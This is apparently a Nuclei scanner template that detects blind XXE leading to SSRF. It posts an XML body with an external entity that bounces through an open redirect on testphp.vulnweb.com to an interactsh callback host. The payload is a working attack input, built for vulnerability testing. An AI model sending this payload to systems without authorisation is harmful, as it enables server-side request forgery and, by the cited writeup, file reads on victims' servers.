http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
    Firefox/116.0

    Content-Type: application/xml;charset=UTF-8


    <?xml version="1.0" ?>

    <!DOCTYPE root [

    <!ENTITY % ext SYSTEM "http://testphp.vulnweb.com/redir.php?r=http://{{interactsh-url}}/x">
    %ext;

    ]>

    <r></r>

    '
  stop-at-first-match: true
id: xxe-via-r-ssrf-redirect
info:
  author: reewardius
  name: SSRF Root
  reference: https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/
  severity: high
  tags: xxe,generic
